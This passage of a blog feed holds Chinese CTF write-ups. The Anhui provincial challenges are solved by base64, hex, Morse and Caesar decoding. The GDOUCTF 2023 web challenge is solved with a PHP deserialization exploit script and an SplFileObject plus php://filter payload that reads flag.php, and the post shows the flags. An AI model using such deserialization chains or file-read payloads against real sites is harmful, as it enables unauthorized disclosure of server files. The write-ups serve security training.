+<p>是个小作文，里面混杂着一串base64编码，考虑解密base64编码，其中一个文件就是flag，重命名所有文件，写一个python脚本，遍历文件，并提取base64编码解码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encoded_data = f.read()</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        <span class="keyword">return</span> decoded_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_files_in_folder</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(folder_path):</span><br><span class="line">        file_path = os.path.join(folder_path, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded_text = decode_base64(file_path)</span><br><span class="line">                <span class="built_in">print</span>(decoded_text)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error decoding <span class="subst">&#123;filename&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你要遍历的文件夹路径</span></span><br><span class="line">folder_path = <span class="string">r&#x27;C:\Users\xtyy\Desktop\CTF\Jack\Jack&#x27;</span></span><br><span class="line">process_files_in_folder(folder_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第227个文件解码失败了，并且其他文件没有出flag，考虑比较特殊的编码，进去看看 <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/2.png" alt="图片2"></p>
+<p>​       随波逐流一键解码，拿到flag，可以算是非预期吧</p>
+<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/3.png" alt="3"></p>
+<h3 id="paint"><a href="#paint" class="headerlink" title="paint"></a>paint</h3><p>拿到图片，提示是画图，010扫一眼文件末尾，冗余较大，复制下来，粘贴到文本文件中，像是16进制编码，赛博大厨解密一下</p>
+<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/4.png" alt="4"></p>
+<p>自动识别 </p>
+<p>解出来像是(x,y)坐标</p>
+<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/5.png" alt="5"></p>
+<p>随波逐流文件操作，一把梭，生成二维码，扫码得到flag</p>
+<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/6.png" alt="6"></p>
+<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto (3&#x2F;4)"></a>Crypto (3&#x2F;4)</h2><h3 id="enemy-command"><a href="#enemy-command" class="headerlink" title="enemy_command"></a>enemy_command</h3><p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/7.png" alt="7"></p>
+<p>看一眼三个值46 45 32猜测摩斯密码，写个简单的脚本46转0，45转1，32转空格</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;6&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;5&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<p>11111 1001 11000 00011 11000 11110 10000 0 11000 00001 11000 1000 10000 01 00001 11100 00001 11100 00011 00011 10000 1000 00001 0 00000 10000 00001 100 00001 100 00000 11000 00011 00011 10000 10000 00011 11111 00001 00111 10000 00011 10000 01111 11000 100</p>
+<p>摩斯密码解密：</p>
+<p>0X73796E747B6A4848336B4E564D4D573366304263617D</p>
+<p>0x开头应该是16进制</p>
+<p>16进制解码：</p>
+<p>synt{jHH3kNVMMW3f0Bca}</p>
+<p>有flag雏形了，考虑是凯撒密码，随波逐流爆破：</p>
+<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/9.png" alt="9"></p>
+<p>拿到flag</p>
+]]></content>
+      <categories>
+        <category>安徽省赛writeup</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[GDOUCTF 2023]反方向的钟</title>
+    <url>/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
+    <content><![CDATA[<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><h2 id="反序列化-原生类的利用"><a href="#反序列化-原生类的利用" class="headerlink" title="反序列化 + 原生类的利用"></a>反序列化 + 原生类的利用</h2><p>题目链接：<a href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
+<span id="more"></span>
+<p>拿到题目，先代码审计</p>
+<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="图片1">​</p>
+<p>看了一下是反序列化攻击</p>
+<p>直接分析代码，满足</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>语句</p>
+<p>执行原生类，然后利用wakeup触发函数，到这里执行，直接贴exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后传入原生类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这里已经给出flag位置，SplFileObject只能读取单行，所以用伪协议读取全文，解密拿到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>
+
+<p>$flag &#x3D; “NSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}”;</p>
+]]></content>
+      <categories>
+        <category>日常writeup</category>
+      </categories>
+      <tags>
         <tag>web</tag>
       </tags>
   </entry>
